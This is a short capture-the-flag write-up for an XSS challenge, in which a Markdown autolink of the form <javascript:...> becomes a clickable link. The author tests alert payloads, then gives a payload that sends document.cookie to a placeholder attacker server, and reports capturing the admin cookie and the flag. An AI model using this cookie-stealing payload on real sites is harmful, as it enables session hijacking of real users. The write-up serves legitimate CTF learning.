# Writeup

### Challenge available at `https://mistune.flatearth.fluxfingers.net/`

# Description:
 Try to steal admin cookie. Admin will click on ```<a>``` tag. This challenge has XSS vulnerability by which you can use it to steal admin cookie.

# Test:

After searching for a while i found this maybe useful ```<javascript:alert('xss')>```,this will create a ```<a>``` tag, i will use this as payload and the result:
![XSS-Test](https://github.com/quanght55/CTFWriteups/blob/master/hackiu/mistune/images/mistune-test-xss.png)

Then i try ```<javascript:alert(document.cookie)>```, the result:
![Cookie-Test](https://github.com/quanght55/CTFWriteups/blob/master/hackiu/mistune/images/mistune-test-cookie.png)

# Exploit:

After testing, i will try to get current session to my server before send script to admin
```<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>``` then i receive this:
![Cookie-to-server](https://github.com/quanght55/CTFWriteups/blob/master/hackiu/mistune/images/mistune-get-cookie-test.png)
Now we are ready to steal admin cookie
```
<javascript:document.location='your/server/here/cookie.php?cookie='+document.cookie>
```

And #BINGO
![Admin-cookie](https://github.com/quanght55/CTFWriteups/blob/master/hackiu/mistune/images/mistune-admin-cookie.png)
# flag{92da883eb1df9d1287ff25f1a1099f29}
:smile: :heavy_check_mark:
